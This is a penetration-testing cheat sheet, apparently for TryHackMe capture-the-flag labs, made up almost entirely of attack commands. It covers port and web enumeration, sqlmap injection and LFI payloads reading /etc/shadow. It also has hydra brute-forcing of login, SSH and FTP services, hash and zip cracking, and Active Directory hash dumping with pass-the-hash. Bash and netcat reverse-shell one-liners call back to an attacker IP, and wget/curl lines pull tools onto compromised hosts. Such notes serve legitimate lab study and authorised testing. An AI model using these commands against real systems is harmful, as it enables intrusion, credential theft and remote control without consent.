# Cheat Sheet

## Enumeration

```
./nmapAutomator.sh 10.10.10.10 all
```
webscan
```
nikto -host 10.10.200.161
```
linux scan
```
enum4linux -a 10.10.26.102 | tee enum4linuxOutput.log
```

wordpress scan
```
wpscan --url blog.thm --enumerate u
```
sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.1.109 --rate=1000 (quick open port scan)

## FTP

use FTP to copy files onto box
```
scp linpeas.sh jan@10.10.122.69:/dev/shm
```

## mysql 

connect to mysql using password
```
mysql -h 10.10.28.115 -u(root) -p(ff912ABD*)
```
after connecting, display all databases
```
show databases;
```
select the database called "data"
```
use data;
```

return all from the table called "USERS"
```
select * from USERS;
```

## sql injection

check if a field is vulnerable to sql injection
get the format of "--data" from brupsuite
```
sqlmap -u 10.10.115.80/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --batch
```
return users from the "users" table
```
sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump
```

## LFI

simple LFI
```
http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
```
apply filter to encode base64, bypass runtime errors
```
http://10.10.109.75/?view=php://filter/convert.base64-encode/resource=dog../../index
```

## mountd (mount NFS drive)

show the avaliable directory to mount
```
/sbin/showmount -e 10.10.10.10 
```

make a directory and mount drive
```
sudo mkdir /mnt/thm
mount 10.10.10.10:/opt/files /mnt/thm
```

unmount the drive after finishing
```
sudo umount -f -l thm
```

## gobuster

standard wordlist
```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
```
short word list
```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 
```

## crack passwords

crack web login portal password
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" 
```

crack wordpress login password on wp-login
```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.67.83 -t 4 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=incorrect" (wordpress)
```

crack password for ssh
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh
```

crack password for ftp
```
hydra -l Queen -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ftp
```

crack password for zip
```
fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./christmaslists.zip (zip password)
```
crack hash, (-m) is the hash id, google hash id
```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt --force 
```

## Encryption

decrypt gpg
```
pg -d note1.txt.gpg 
```
extract stenography
```
steghide extract -sf ./TryHackMe.jpg
```
crack stenography password using wordlist
```
/home/kali/.local/bin/stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```
return meta data
```
exiftool ./tryHackMe.jpg
```

crack zip password
```
/usr/sbin/zip2john 8702.zip > output
sudo john output
```
check for hidden files, then extract
```
binwalk cutie.png
binwalk cutie.png -e 
```

asymmetric decryption using private key
```
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt
```

## reverse shell 

```
bash -i >& /dev/tcp/10.4.9.144/1234 0>&1
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.144 1234 >/tmp/f
```

## listen for reverse shell

on local machine
```
netcat -lvnp 1234
```

upgrade shell
```
python -c "import pty; pty.spawn('/bin/bash')"

control+z

stty raw -echo

fg

press enter a few times

export TERM=xterm
```

## ssh with private key

convert key to john format and crack private key password
```
/usr/share/john/ssh2john.py key > forjohn
/usr/sbin/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
```

ssh in using private key
```
chmod 600 key
ssh -i key kay@10.10.122.69
```

## upload files to box

host on own computer
```
sudo python -m SimpleHTTPServer 8000
```

get on box
```
wget http://10.4.9.144:8000/linpeas.sh
```

use curl on box if wget is not avaliable 
```
curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
```
## download files from box

on own machine
```
scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
```

## Active Directory

enumerate users - requires wordlist of usernames

```
./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
```

Which user account can you query a ticket from with no password?
```
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
```

enum shares on active directory - no password required
```
smbclient -L 10.10.4.164 
```

enum shares as user - requires password
```
smbclient -L 10.10.4.164 --user svc-admin
```

connect to share as user- requires password
```
smbclient //10.10.4.164/backup --user svc-admin
```

dump all hashes - requires password
```
secretsdump.py backup@10.10.4.164 -just-dc
```

pass the hash 
```
evil-winrm -i 10.10.4.164 -u Administrator -H e4876a80a723612986d7609aa5ebc12b
```
## Assembly

start debug mode 
```
r2 -d <program>
```

search for main function 
```
s  main
```

view disassembly
```
pd
```

break point 
```
db <address value>
```

run until next break point
```
dc
```

print register values
```
dr <register>
```

## CheckList


<details>
<summary>Login Page</summary>
  crack password using hydra<br>
  use SQL injection to bypass login<br>
  use cookie to login<br>
  check source of login page<br>
</details>
